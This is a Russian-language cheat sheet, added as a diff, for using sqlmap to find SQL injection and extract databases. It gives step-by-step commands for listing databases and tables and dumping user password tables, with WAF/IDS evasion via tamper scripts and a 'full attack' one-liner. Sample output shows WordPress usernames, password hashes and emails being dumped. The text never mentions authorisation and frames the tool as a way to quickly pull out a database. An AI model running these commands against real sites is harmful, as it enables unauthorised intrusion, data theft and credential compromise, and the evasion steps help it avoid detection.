@@ -1,0 +1,88 @@
+=== SQLMAP — автоматический поиск и взлом SQL-инъекций ===
+
+Что делает: Находит SQL-инъекции, вытаскивает базы данных, таблицы, пароли
+
+Установка:
+sudo apt install sqlmap
+или
+git clone https://github.com/sqlmapproject/sqlmap.git
+
+
+=== БАЗОВЫЕ КОМАНДЫ (от простого к сложному) ===
+
+1. ПРОВЕРИТЬ, ЕСТЬ ЛИ ИНЪЕКЦИЯ:
+sqlmap -u "http://site.com/page?id=1"
+
+2. УЗНАТЬ СПИСОК БАЗ ДАННЫХ:
+sqlmap -u "http://site.com/page?id=1" --dbs
+
+3. ВЫБРАТЬ БАЗУ И УЗНАТЬ ТАБЛИЦЫ:
+sqlmap -u "http://site.com/page?id=1" -D имя_базы --tables
+
+4. ВЫТАЩИТЬ СОДЕРЖИМОЕ ТАБЛИЦЫ:
+sqlmap -u "http://site.com/page?id=1" -D имя_базы -T имя_таблицы --dump
+
+5. ВЫТАЩИТЬ ВСЕ ПАРОЛИ (обычно в таблице users):
+sqlmap -u "http://site.com/page?id=1" -D имя_базы -T users --dump
+
+
+=== РАБОТА С ФОРМАМИ POST ===
+
+sqlmap -u "http://site.com/login.php" --data "user=admin&pass=123" --method POST
+
+
+=== ЕСЛИ ЕСТЬ КУКИ (требуется авторизация) ===
+
+sqlmap -u "http://site.com/page?id=1" --cookie "PHPSESSID=abc123"
+
+
+=== ПОЛЕЗНЫЕ ФЛАГИ ===
+
+--level=2,3,4,5          → Уровень проверки (5 — максимальный, медленный)
+--risk=2,3               → Риск (3 — максимальный, может сломать БД)
+--threads=10             → Количество потоков (ускоряет)
+--batch                  → Не спрашивать подтверждения (автоматический режим)
+--random-agent           → Случайный User-Agent
+--proxy="http://127.0.0.1:8080"  → Прогнать через Burp
+--no-cast                → Отключает преобразование типов (быстрее)
+
+
+=== ИЗБЕГАНИЕ ОБНАРУЖЕНИЯ (WAF/IDS) ===
+
+--tamper=space2comment   → Замена пробелов на комментарии
+--tamper=between,randomcase  → Несколько обфускаций
+
+
+=== ПРИМЕР ПОЛНОЙ АТАКИ ===
+
+sqlmap -u "http://site.com/category?id=1" --cookie "ses=xyz" --dbs --batch --threads=5
+
+
+=== ЧТО ВЫ УВИДИТЕ ===
+
+[INFO] testing if 'id' parameter is injectable
+[INFO] 'id' is vulnerable (MySQL)
+[INFO] available databases [3]:
+[*] information_schema
+[*] wordpress_db
+[*] users
+
+[INFO] Table: wp_users
+[INFO] Columns: user_login, user_pass, user_email
+[INFO] Dumping data:
+| admin | $P$B123... | admin@site.com |
+| john  | $P$B456... | john@site.com  |
+
+
+=== ВАЖНО ===
+
+— Начинайте с --batch, чтобы не отвечать на вопросы
+— Не используйте --dump без указания --threads (очень медленно)
+— Будьте осторожны с --risk=3 (риск модификации данных)
+
+
+=== КОГДА ИСПОЛЬЗОВАТЬ ===
+
+— Есть GET/POST параметр в URL или форме
+— Увидели SQL-ошибку или подозреваете инъекцию
+— Нужно быстро вытащить базу данных
